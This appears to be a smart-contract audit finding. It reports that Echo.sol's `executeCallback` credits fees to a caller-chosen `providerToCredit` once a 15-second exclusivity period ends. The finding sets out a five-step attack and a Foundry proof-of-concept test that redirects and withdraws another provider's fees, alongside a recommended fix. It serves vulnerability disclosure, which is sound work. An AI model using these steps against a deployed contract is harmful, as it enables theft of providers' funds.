### Title
Caller-Controlled `providerToCredit` in `executeCallback` Allows Fee Theft After Exclusivity Period - (File: `target_chains/ethereum/contracts/contracts/echo/Echo.sol`)

### Summary

In `Echo.sol`, the `executeCallback` function accepts a caller-supplied `providerToCredit` address and credits the full request fee to that address. After the exclusivity period expires, there is no restriction on who can call `executeCallback` or what address they pass as `providerToCredit`. Any unprivileged actor who has permissionlessly registered as a provider can redirect fees that belong to the legitimate assigned provider to their own address.

### Finding Description

`executeCallback` in `Echo.sol` accepts `providerToCredit` as a free parameter from the caller:

```solidity
function executeCallback(
    address providerToCredit,
    uint64 sequenceNumber,
    bytes[] calldata updateData,
    bytes32[] calldata priceIds
) external payable override {
```

During the exclusivity window it enforces `providerToCredit == req.provider`:

```solidity
if (block.timestamp < req.publishTime + _state.exclusivityPeriodSeconds) {
    require(
        providerToCredit == req.provider,
        "Only assigned provider during exclusivity period"
    );
}
```

After the exclusivity period, this check is skipped entirely. The full fee is then credited unconditionally to the caller-supplied address:

```solidity
_state.providers[providerToCredit].accruedFeesInWei += SafeCast
    .toUint128((req.fee + msg.value) - pythFee);
```

There is no validation that `providerToCredit` equals `req.provider` or is even a legitimately operating provider. Provider registration is permissionless:

```solidity
function registerProvider(
    uint96 baseFeeInWei,
    uint96 feePerFeedInWei,
    uint96 feePerGasInWei
) external override {
    ProviderInfo storage provider = _state.providers[msg.sender];
    require(!provider.isRegistered, "Provider already registered");
    ...
    provider.isRegistered = true;
```

An attacker can therefore:
1. Call `registerProvider` with any fee values to register their own address as a provider.
2. Call `setFeeManager(attacker_address)` to set themselves as their own fee manager.
3. Wait for the exclusivity period (default 15 seconds) to expire on any pending request.
4. Call `executeCallback(attacker_address, sequenceNumber, updateData, priceIds)`.
5. Call `withdrawAsFeeManager(attacker_address, amount)` to extract the stolen fees.

The default exclusivity period is 15 seconds, making the window for exploitation extremely short and the attack trivially automatable.

### Impact Explanation

The legitimate provider (`req.provider`) that was assigned to fulfill the request loses all accrued fees for that request. The fees paid by the user at request time (`req.fee`) are permanently redirected to the attacker's provider account. This is a direct loss of funds for legitimate Echo providers. At scale, an attacker monitoring the mempool can front-run or immediately follow every request's exclusivity expiry to systematically drain provider revenue.

### Likelihood Explanation

Likelihood is HIGH:
- Provider registration is permissionless — no barrier to entry for the attacker.
- The exclusivity period is only 15 seconds by default, making automation trivial.
- The attack requires no privileged access, no leaked keys, and no governance majority.
- The attacker only needs to supply valid `updateData` and `priceIds` (publicly available from Pyth's data feeds) and call the function after 15 seconds.
- The economic incentive is direct: the attacker captures 100% of the provider fee for every request they front-run.

### Recommendation

After the exclusivity period, restrict `providerToCredit` to only registered providers that are willing to fulfill requests, or — more directly — always credit `req.provider` regardless of who calls `executeCallback`. If the design intent is to allow any provider to fulfill after exclusivity, the fee should still go to `req.provider` unless a separate penalty/redistribution mechanism is explicitly designed. At minimum, validate that `providerToCredit` is a registered provider and that the caller is `providerToCredit` itself:

```solidity
require(
    _state.providers[providerToCredit].isRegistered,
    "providerToCredit not registered"
);
require(
    msg.sender == providerToCredit,
    "Caller must be providerToCredit"
);
```

### Proof of Concept

```solidity
// 1. Attacker registers as a provider (permissionless)
vm.prank(attacker);
echo.registerProvider(1, 1, 1);

// 2. Attacker sets themselves as fee manager
vm.prank(attacker);
echo.setFeeManager(attacker);

// 3. Legitimate user makes a request to defaultProvider
vm.prank(user);
echo.requestPriceUpdatesWithCallback{value: fee}(
    defaultProvider, publishTime, priceIds, gasLimit
);

// 4. Wait for exclusivity period to expire (15 seconds)
vm.warp(block.timestamp + 16);

// 5. Attacker calls executeCallback with their own address as providerToCredit
vm.prank(attacker);
echo.executeCallback(attacker, sequenceNumber, updateData, priceIds);

// 6. Attacker withdraws the stolen fees
uint128 stolenFees = echo.getProviderInfo(attacker).accruedFeesInWei;
vm.prank(attacker);
echo.withdrawAsFeeManager(attacker, stolenFees);

// defaultProvider receives 0 fees; attacker receives the full req.fee
assertEq(echo.getProviderInfo(defaultProvider).accruedFeesInWei, 0);
assertEq(attacker.balance, stolenFees);
```
